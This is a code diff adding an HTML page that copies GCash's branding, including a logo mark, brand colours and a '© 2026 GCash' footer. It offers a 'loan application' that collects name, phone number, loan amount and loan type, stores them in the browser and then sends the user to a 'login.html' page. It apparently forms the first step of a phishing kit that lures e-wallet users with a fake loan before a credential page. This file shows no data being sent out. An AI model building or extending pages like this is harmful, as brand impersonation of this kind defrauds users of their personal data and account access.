@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GCash Details</title>
+  <style>
+    :root {
+      --bg: #f5f6f8;
+      --primary: #00b14f;
+      --primary-dark: #0d8d42;
+      --primary-soft: #dff9eb;
+      --ink: #1c1c1e;
+      --muted: #6b7280;
+      --line: #e8ebef;
+      --shadow: 0 22px 50px rgba(15, 23, 42, 0.12);
+      --error: #ef4444;
+      --error-soft: #fee2e2;
+    }
+
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      height: 100%;
+      font-family: Inter, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: linear-gradient(180deg, #edf7f2 0%, #f6f7fb 100%);
+      color: var(--ink);
+    }
+    body {
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+    .phone {
+      width: 100%;
+      max-width: 420px;
+      min-height: 820px;
+      background: linear-gradient(180deg, #fbfcff 0%, #f6f9fd 100%);
+      border-radius: 34px;
+      border: 1px solid rgba(17, 24, 39, 0.05);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      position: relative;
+    }
+    .screen {
+      min-height: 820px;
+      padding: 26px 20px 110px;
+      position: relative;
+    }
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 22px;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .brand-mark {
+      width: 36px;
+      height: 36px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary) 0%, #22c55e 100%);
+      position: relative;
+      box-shadow: 0 10px 18px rgba(0, 177, 79, 0.25);
+    }
+    .brand-mark::before {
+      content: "G";
+      position: absolute;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      color: white;
+      font-weight: 900;
+      font-size: 20px;
+    }
+    .brand-text {
+      font-size: 18px;
+      font-weight: 900;
+      letter-spacing: -0.04em;
+    }
+    .chip {
+      background: var(--primary-soft);
+      color: var(--primary-dark);
+      border-radius: 999px;
+      padding: 8px 12px;
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+    }
+    .progress-bar {
+      width: 100%;
+      height: 5px;
+      background: var(--line);
+      border-radius: 999px;
+      margin-bottom: 24px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), #22c55e);
+      transition: width 0.3s ease;
+    }
+    .hero {
+      margin-top: 12px;
+      margin-bottom: 8px;
+      font-size: 36px;
+      line-height: 1.08;
+      font-weight: 900;
+      letter-spacing: -0.06em;
+    }
+    .sub {
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+    .field {
+      margin-bottom: 18px;
+    }
+    .label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 11px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #4b5563;
+      font-weight: 800;
+    }
+    .input, .select {
+      width: 100%;
+      height: 54px;
+      border-radius: 16px;
+      border: 1px solid var(--line);
+      background: rgba(255,255,255,0.9);
+      padding: 0 16px;
+      font-size: 15px;
+      color: var(--ink);
+      outline: none;
+      transition: 0.2s ease;
+    }
+    .input:focus, .select:focus {
+      border-color: rgba(0, 177, 79, 0.7);
+      box-shadow: 0 0 0 4px rgba(0, 177, 79, 0.12);
+    }
+    .input.error {
+      border-color: var(--error);
+    }
+    .btn {
+      width: 100%;
+      border: none;
+      background: linear-gradient(135deg, var(--primary) 0%, #13a95b 100%);
+      color: #fff;
+      height: 58px;
+      border-radius: 18px;
+      font-size: 16px;
+      font-weight: 900;
+      letter-spacing: 0.02em;
+      cursor: pointer;
+      box-shadow: 0 16px 28px rgba(0, 177, 79, 0.24);
+      transition: 0.2s ease;
+      margin-top: 8px;
+    }
+    .btn:hover { transform: translateY(-2px); }
+    .footer {
+      position: absolute;
+      left: 20px;
+      right: 20px;
+      bottom: 12px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 11px;
+      letter-spacing: 0.05em;
+    }
+    .error-message {
+      display: none;
+      background: var(--error-soft);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      border-radius: 16px;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      font-size: 13px;
+      color: #991b1b;
+      line-height: 1.5;
+    }
+    .error-message.show { display: block; }
+  </style>
+</head>
+<body>
+  <div class="phone">
+    <section class="screen">
+      <div class="topbar">
+        <div class="brand">
+          <div class="brand-mark"></div>
+          <div class="brand-text">GCash</div>
+        </div>
+        <span class="chip">Apply</span>
+      </div>
+
+      <div class="progress-bar">
+        <div class="progress-fill" style="width: 40%;"></div>
+      </div>
+
+      <h1 class="hero">Loan details</h1>
+      <div class="sub">Add your basic application details so we can prepare your verification.</div>
+
+      <div id="errMsg" class="error-message"></div>
+
+      <div class="field">
+        <label class="label" for="firstName">First name</label>
+        <input id="firstName" class="input" type="text" placeholder="Enter your first name" />
+      </div>
+
+      <div class="field">
+        <label class="label" for="lastName">Last name</label>
+        <input id="lastName" class="input" type="text" placeholder="Enter your last name" />
+      </div>
+
+      <div class="field">
+        <label class="label" for="phone">Phone number</label>
+        <input id="phone" class="input" type="tel" maxlength="11" placeholder="09XX XXX XXXX" inputmode="numeric" />
+      </div>
+
+      <div class="field">
+        <label class="label" for="loanAmount">Loan amount</label>
+        <input id="loanAmount" class="input" type="number" min="1" step="100" placeholder="Enter loan amount" />
+      </div>
+
+      <div class="field">
+        <label class="label" for="loanType">Loan type</label>
+        <select id="loanType" class="select">
+          <option value="">Select loan type</option>
+          <option value="Salary Loan">Salary Loan</option>
+          <option value="Business Loan">Business Loan</option>
+          <option value="Quick Loan">Quick Loan</option>
+          <option value="Personal Loan">Personal Loan</option>
+        </select>
+      </div>
+
+      <button class="btn" id="continueBtn">Continue</button>
+    </section>
+
+    <div class="footer">© 2026 GCash. All rights reserved.</div>
+  </div>
+
+  <script>
+    const errMsg = document.getElementById('errMsg');
+    const continueBtn = document.getElementById('continueBtn');
+    const firstNameInput = document.getElementById('firstName');
+    const lastNameInput = document.getElementById('lastName');
+    const phoneInput = document.getElementById('phone');
+    const loanAmountInput = document.getElementById('loanAmount');
+    const loanTypeInput = document.getElementById('loanType');
+
+    function showError(msg) {
+      errMsg.textContent = msg;
+      errMsg.classList.add('show');
+    }
+
+    function hideError() {
+      errMsg.classList.remove('show');
+    }
+
+    function normalizePhone(phone) {
+      const digits = String(phone || '').replace(/\D/g, '');
+      const noIntl = digits.startsWith('63') ? digits.slice(2) : digits;
+      const last10 = noIntl.slice(-10);
+      return (last10.startsWith('9') ? '0' + last10 : last10).slice(-10);
+    }
+
+    function loadExistingApplication() {
+      try {
+        const stored = JSON.parse(localStorage.getItem('loanApplication') || '{}');
+        if (!stored || typeof stored !== 'object') return;
+
+        firstNameInput.value = stored.firstName || '';
+        lastNameInput.value = stored.lastName || '';
+        phoneInput.value = stored.phone || '';
+        loanAmountInput.value = stored.loanAmount || '';
+        loanTypeInput.value = stored.loanType || '';
+      } catch (e) {
+        console.warn('Unable to load saved application', e);
+      }
+    }
+
+    function saveApplicationDetails() {
+      const firstName = firstNameInput.value.trim();
+      const lastName = lastNameInput.value.trim();
+      const phone = normalizePhone(phoneInput.value);
+      const loanAmount = loanAmountInput.value.trim();
+      const loanType = loanTypeInput.value.trim();
+
+      if (!firstName || !lastName) {
+        showError('Please enter your full name.');
+        return false;
+      }
+
+      if (!phone || phone.length !== 10) {
+        showError('Please enter a valid 10-digit mobile number.');
+        return false;
+      }
+
+      if (!loanAmount || Number(loanAmount) <= 0) {
+        showError('Please enter a valid loan amount.');
+        return false;
+      }
+
+      if (!loanType) {
+        showError('Please select a loan type.');
+        return false;
+      }
+
+      const application = {
+        firstName,
+        lastName,
+        phone,
+        loanAmount,
+        loanType,
+        savedAt: new Date().toISOString()
+      };
+
+      localStorage.setItem('loanApplication', JSON.stringify(application));
+      localStorage.setItem('gcashPhone', phone);
+      localStorage.setItem('loanApplicationDraft', JSON.stringify(application));
+
+      return true;
+    }
+
+    phoneInput.addEventListener('input', () => {
+      let value = phoneInput.value.replace(/\D/g, '').slice(0, 11);
+      if (value.startsWith('63')) value = value.slice(2);
+      if (value && value.startsWith('9') && !value.startsWith('0')) {
+        value = '0' + value;
+      }
+      phoneInput.value = value.slice(0, 11);
+    });
+
+    continueBtn.addEventListener('click', () => {
+      hideError();
+      if (saveApplicationDetails()) {
+        window.location.href = 'login.html';
+      }
+    });
+
+    loadExistingApplication();
+  </script>
+</body>
+</html>
